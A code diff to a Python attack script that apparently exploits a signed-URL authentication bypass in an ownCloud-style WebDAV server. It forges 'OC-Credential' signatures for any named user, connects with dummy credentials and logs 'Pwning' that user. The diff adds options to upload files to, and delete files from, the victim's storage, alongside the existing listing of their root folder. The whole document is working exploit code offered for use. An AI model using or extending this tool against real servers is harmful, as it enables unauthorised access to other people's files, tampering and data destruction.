@@ -36,8 +36,6 @@ def sign(url, method):
     else:
         netloc = parsed_url.netloc
     
-    
-
     new_param = {}
     new_param['OC-Credential'] = username
     current_time_utc = datetime.now(timezone.utc)
@@ -62,15 +60,14 @@ def sign(url, method):
     logging.debug(f'{method} : {reconstructed_url}')
     return reconstructed_url
 
-
 def new_send(self, method, path, expected_code, **kwargs):
-        url = self._get_url(path)
-        url = sign(url, method)
-        response = self.session.request(method, url, allow_redirects=False, **kwargs)
-        if isinstance(expected_code, Number) and response.status_code != expected_code \
-            or not isinstance(expected_code, Number) and response.status_code not in expected_code:
-            raise OperationFailed(method, path, expected_code, response.status_code)
-        return response
+    url = self._get_url(path)
+    url = sign(url, method)
+    response = self.session.request(method, url, allow_redirects=False, **kwargs)
+    if isinstance(expected_code, Number) and response.status_code != expected_code \
+        or not isinstance(expected_code, Number) and response.status_code not in expected_code:
+        raise OperationFailed(method, path, expected_code, response.status_code)
+    return response
 
 easywebdav.Client._send = new_send
 
@@ -82,6 +79,9 @@ def main():
     parser.add_argument('-s','--sign', help='sign a single url with GET method', dest="urltosign")
     parser.add_argument('-u', '--username', help='specify a username', required=True, dest="username")
     parser.add_argument('-t', '--target', help='specify a host, should NOT ends with "/remote.php/webdav/"', required=True, dest="target")
+    parser.add_argument('-f', '--file', help='specify the file to upload', dest="file")
+    parser.add_argument('-d', '--destination', help='specify the destination path on the WebDAV server', dest="destination")
+    parser.add_argument('-r', '--remove', help='specify the file to remove from the WebDAV server', dest="remove")
     
     args = parser.parse_args()
     
@@ -94,17 +94,27 @@ def main():
     username = args.username
     logging.info(f'Pwning {username}!')
 
-    if args.urltosign!=None:
+    if args.urltosign:
         # or just "sign"
         logging.info(sign(args.urltosign, 'GET'))
         return
     
     parsed_target = urlparse(args.target)
-    webdav = easywebdav.connect(parsed_target.hostname, port=parsed_target.port, protocol=parsed_target.scheme, path = parsed_target.path + "/remote.php/webdav/", username=':)', password=':)')
+    webdav = easywebdav.connect(parsed_target.hostname, port=parsed_target.port, protocol=parsed_target.scheme, path=parsed_target.path + "/remote.php/webdav/", username=':)', password=':)')
     
-    logging.info(f"{username}'s root folder content")
-    for entity in webdav.ls(""):
-        logging.info(entity)
+    if args.file and args.destination:
+        # Upload file
+        with open(args.file, 'rb') as f:
+            webdav.upload(f, args.destination)
+        logging.info(f"Uploaded {args.file} to {args.destination}")
+    elif args.remove:
+        # Remove file
+        webdav.delete(args.remove)
+        logging.info(f"Removed {args.remove}")
+    else:
+        logging.info(f"{username}'s root folder content")
+        for entity in webdav.ls(""):
+            logging.info(entity)
     '''
     # dont do this
     webdav.mkdir('some_dir', safe=True)
